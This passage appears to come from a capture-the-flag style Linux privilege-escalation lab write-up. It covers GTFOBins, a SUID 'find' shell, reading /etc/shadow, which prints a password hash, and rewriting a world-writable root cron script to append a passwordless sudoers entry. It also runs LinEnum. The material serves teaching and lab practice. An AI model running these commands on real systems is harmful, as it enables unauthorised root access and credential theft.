*GTFOBins*, abbreviation of "Get The F*** Out of the Binaries," is an open-source project that compiles methods of executing privileged commands and bypassing security restrictions using system binaries commonly available on Unix and Unix-like systems. The project was created to highlight the dangers of granting elevated privileges to certain programs or binaries and to educate system administrators about cybersecurity.

It provides a collection of "payloads" (sequences of commands) that exploit unintentional or little-known features of certain system binaries to gain privileged access or perform unauthorized actions. These payloads are organized by binary, allowing users to quickly find methods of executing privileged commands using specific binaries.

**Step 2A**.

`find . -exec /bin/sh -p \; -quit`:
```
# id
uid=1001(student) gid=1001(student) euid=0(root) groups=1001(student) ←
```
We notice that we have gained root privileges.

Let's confirm it by reading the `/etc/shadow` file. The shadow file stores all the present user's password hashes.

`cat /etc/shadow`:
```
root:*:18960:0:99999:7:::
daemon:*:18960:0:99999:7:::
bin:*:18960:0:99999:7:::
sys:*:18960:0:99999:7:::
sync:*:18960:0:99999:7:::
games:*:18960:0:99999:7:::
man:*:18960:0:99999:7:::
lp:*:18960:0:99999:7:::
mail:*:18960:0:99999:7:::
news:*:18960:0:99999:7:::
uucp:*:18960:0:99999:7:::
proxy:*:18960:0:99999:7:::
www-data:*:18960:0:99999:7:::
backup:*:18960:0:99999:7:::
list:*:18960:0:99999:7:::
irc:*:18960:0:99999:7:::
gnats:*:18960:0:99999:7:::
nobody:*:18960:0:99999:7:::
systemd-network:*:18960:0:99999:7:::
systemd-resolve:*:18960:0:99999:7:::
syslog:*:18960:0:99999:7:::
messagebus:*:18960:0:99999:7:::
_apt:*:18960:0:99999:7:::
lxd:*:18960:0:99999:7:::
uuidd:*:18960:0:99999:7:::
dnsmasq:*:18960:0:99999:7:::
landscape:*:18960:0:99999:7:::
sshd:*:18960:0:99999:7:::
pollinate:*:18960:0:99999:7:::
ubuntu:!:19013:0:99999:7:::
student:$6$66YLXJK4$RikcVQkp9i9gMphB05nY/QIjAXIBBtam8Ft3ljz1NTBN0DI/yJqZD6RH/dvpNU7KpWuZMvlqC9p4rGWhuveI80:19013:0:99999:7:::
```

`ls -l /root`:
```
total 8
-rw-r--r-- 1 root    root      33 Jan 21  2022 flag ←
drwxr-xr-x 3 student student 4096 Jan 21  2022 snap
```

`cat /root/flag`:
```
697914df7a07bb9b718c8ed258150164 ←
```

`exit`.

**Step 1B**.

`ls -la /home/student/`:
```
total 40
drwxr-xr-x 5 student student 4096 Jan 21  2022 .
drwxr-xr-x 4 root    root    4096 Jan 21  2022 ..
-rw------- 1 student student   62 Jan 21  2022 .bash_history
-rw-r--r-- 1 student student  220 Jan 21  2022 .bash_logout
-rw-r--r-- 1 student student 3772 Jan 21  2022 .bashrc
drwx------ 2 student student 4096 Jan 21  2022 .cache
drwx------ 3 student student 4096 Jan 21  2022 .gnupg
-rw-r--r-- 1 student student  807 Jan 21  2022 .profile
drwxrwxr-x 2 student student 4096 Jan 21  2022 .ssh
-rw------- 1 root    root      27 Jan 21  2022 message ←
```
The root user has the READ/WRITE permissions. So we can't even read it.

`find / -type f -name "message"`:
```
/home/student/message
/tmp/message ←
```
We can observe that a file with the same name is present in the `/tmp` directory.

If we check this file multiple times, we can observe that this file is being overwritten every minute. 
`ls -l /tmp/message`:
```
-rw-r--r-- 1 root root 27 Feb 22 15:24 /tmp/message
```
`ls -l /tmp/message`:
```
-rw-r--r-- 1 root root 27 Feb 22 15:25 /tmp/message
```
`ls -l /tmp/message`:
```
-rw-r--r-- 1 root root 27 Feb 22 15:26 /tmp/message
```

Some script/binary is copying this file from the `/home/student` directory to `/tmp` directory. Let's try to search that script. If the script is doing a simple copy operation, it must have the source destination of the file in it. 

`grep -nri "/tmp/message" / 2> /dev/null`:
```
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message ←
/usr/local/share/copy.sh:3:chmod 644 /tmp/message ←
```
We have found the script location (`/usr/local/share/copy.sh`), which is copying the message file to the `/tmp` directory.

Let's check the content of this script file and its permissions.

`cat /usr/local/share/copy.sh`:
```
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
```

`ls -l /usr/local/share/copy.sh`:
```
-rwxrwxrwx 1 root root 74 Jan 21  2022 /usr/local/share/copy.sh ←
```

**Step 2B**.

Let's check which commands the user can execute with sudo.

`sudo -l`:
```
Matching Defaults entries for student on ip-10-4-26-123:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on ip-10-4-26-123:
    (root) NOPASSWD: /etc/init.d/cron ←
```
The student has permission to restart/start the cron service.

As the script file is writable by the current student user, we can modify the `copy.sh` file to execute our commands. A root cron job manages this script, which allows us to run commands as root after modifying the file.

**Step 3B**.

`echo -e '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`.
These lines will push an entry into the `/etc/sudoers` file, which will allow the student user to run all commands as root using sudo without providing any password.

`cat /usr/local/share/copy.sh`:
```
#! /bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers ←
```

Now, we will wait for one minute to allow the cron job to execute the `copy.sh` script where we have added our code to gain root access.

After one minute, we will check the current sudoers list.

`sudo -l`:
```
Matching Defaults entries for student on ip-10-2-22-112:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on ip-10-2-22-112:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL ←
```

We can observe that we can use sudo to access all resources on the system.


Let's switch to the root user using sudo.
`sudo su`.

`id`:
```
uid=0(root) gid=0(root) groups=0(root)
```

`ls -l /root`:
```
total 8
-rw-r--r-- 1 root    root      33 Jan 21  2022 flag ←
drwxr-xr-x 3 student student 4096 Jan 21  2022 snap
```

`cat /root/flag`:
```
697914df7a07bb9b718c8ed258150164 ←
```

`exit`.

**Step 1C**.

It is time-consuming to check all possible misconfiguration flaws for the privilege escalation. There are many good bash scripts which are useful for automation.
One of them is **LinEnum** (present in `/opt` folder).

Let's run to find all the information about the system.
We would expect a lot of output, so we'll save all the result into an output file.

`/opt/LinEnum/LinEnum.sh > /home/student/linenum_output.txt`
`cat /student/home/linenum_output.txt`

Now, based on the output information, we can find a way to access the root.

---
---
